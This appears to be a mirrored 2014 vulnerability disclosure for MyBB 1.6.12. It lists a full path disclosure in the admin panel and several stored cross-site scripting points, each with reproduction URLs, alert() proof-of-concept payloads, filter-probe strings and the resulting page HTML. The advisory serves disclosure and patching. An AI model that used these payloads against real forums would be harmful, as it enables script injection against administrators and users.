@@ -1,0 +1,137 @@
+id: 21746
+date: 01/12/2014
+title: MyBB 1.6.12 - Admin Panel FPD & Multiple XSS
+author: Smash_
+cves: 
+
+#Title: MyBB 1.6.12 - Admin Panel FPD & Multiple XSS
+#Date: 01.11.2014
+#Tested on: Linux 3.7-trunk-686-pae #1 SMP Debian 3.7.2-0+kali8 i686 GNU/Linux
+#Vendor: mybb.com
+#Version: 1.6.12 - Latest ATM
+#Contant: smash@devilteam.pl
+
+1. Cross Site Scripting in Installation Wizard
+
+ a) Database Configuration
+
+Fill Database Name with your JS, for example - <script>alert(666)</script>
+
+In fact, other input's are also vulnerable.
+
+While there's an error in database configuration, the alert will popup.
+
+Line 56:
+<li>Could not select the database '<script>alert(1)</script>'. Are you sure it exists and the specified username and password have access to it?</li>
+
+ b) Table Creation
+
+If table prefix will contain JS script, it will be executed in next step (Table Creation).
+
+2. Full Path Disclosure in Administration Panel
+
+localhost/mybb/Upload/admin/index.php?module[]=
+
+Warning [2] strpos() expects parameter 1 to be string, array given - Line: 507 - File: localhost/mybb/Upload/admin/index.php PHP 5.4.4-14+deb7u5 (Linux)
+Warning [2] explode() expects parameter 2 to be string, array given - Line: 509 - File: localhost/mybb/Upload/admin/index.php PHP 5.4.4-14+deb7u5 (Linux)
+
+Error's appears at line's 507 & 509.
+
+3. Multiple Persistent Cross Site Scripting in Administration Panel
+
+ a) Smiles
+
+Go to -> Edit Smilies, for example:
+
+localhost/mybb/Upload/admin/index.php?module=config-smilies&action=edit&sid=10
+
+Now, fill image path with:
+
+images/smilies/angel.gif'';!--"/><script>alert(666)</script>
+
+Alert will appear whenever someone enter smilies configuration:
+localhost/mybb/Upload/admin/index.php?module=config-smilies
+
+ b) MyCode
+
+Go to -> Edit My Code, for example:
+
+localhost/mybb/Upload/admin/index.php?module=config-mycode&action=edit&cid=1
+
+Fill title and short description with <script>alert(666)</script>, alert
+will appear whenever someone visit:
+
+localhost/mybb/Upload/admin/index.php?module=config-mycode
+
+ c) Post Icons
+
+Go to -> Post Icons, for example:
+
+mybb/Upload/admin/index.php?module=config-post_icons&action=edit&iid=7
+
+Fill image path with: 
+images/icons/biggrin.gif'';!--"/><script>alert(666)</script>
+
+Now, the alert will appear whenever there will be possibility to use them, like
+posting new thread.
+
+Examples:
+localhost/mybb/Upload/modcp.php?action=edit_announcement&aid=1
+localhost/mybb/Upload/calendar.php?action=addevent&calendar=1&private=1
+localhost/mybb/Upload/newthread.php?fid=2
+
+ d) Find Users
+
+First, create custom profile field with JS code or whatever, like '';!--"<XSS>=> at:
+localhost/mybb/Upload/admin/index.php?module=config-profile_fields
+
+Then, goto:
+localhost/mybb/Upload/admin/index.php?module=user-users&vid=1
+
+XSS appears at lines 167 & 168:
+<td class="first" style="" id="profile_field_fid3"><label>'';!--"<XSS>=</label>
+<div class="description">'';!--"<XSS>=</div>
+
+ e) Warning System
+
+Go to Warning System, then 'Add New Warning Type':
+localhost/mybb/Upload/admin/index.php?module=config-warning&action=add_type
+
+Fill warning's title with: <script>alert(666)</script>
+
+ f) Annoucments
+
+As administrator or moderatore, create new annoucment:
+localhost/mybb/Upload/admin/index.php?module=forum-announcements&action=edit&aid=1
+
+Fill message with your code, for example: '';!--"<XSS>=&{()}
+
+Now, visit your annoucment:
+localhost/mybb/Upload/announcements.php?aid=1
+
+As you can see, brackets are not filtered:
+	<div class="post_body" id="pid_">
+		'';!--"<XSS>=&{()}`1
+	</div>
+
+ g) Forum Managment
+
+Go to Forum Managment:
+localhost/mybb/Upload/admin/index.php?module=forum-management&action=edit&fid=2
+
+Fill Title, Description and Rules with its title (Remember to change display method) with your code, for example - '';!--"<XSS>=&{()}.
+
+Firstly, XSS will appear in:
+localhost/mybb/Upload/admin/index.php?module=forum-management
+<td class="first" style=""><div style="padding-left: 40px;"><a href="index.php?module=forum-management&amp;fid=2">My Forum'';!--"<XSS>=&amp;{()}</a><br /><small>'';!--"<XSS>=&amp;{()}</small></div></td>
+
+Now, display the forum: 
+localhost/mybb/Upload/forumdisplay.php?fid=2
+
+There's XSS at lines:
+133 - <strong>My Forum'';!--"<XSS>=&amp;{()}</strong>
+93 - <span class="active">My Forum'';!--"<XSS>=&amp;{()}</span>
+108 - <td class="thead"><strong>'';!--"<XSS>=&{()}</strong></td>
+111 - <td class="trow1"><span class="smalltext">'';!--"<XSS>=&{()}</span></td>
+
+#  0day.today [2023-03-25]  #
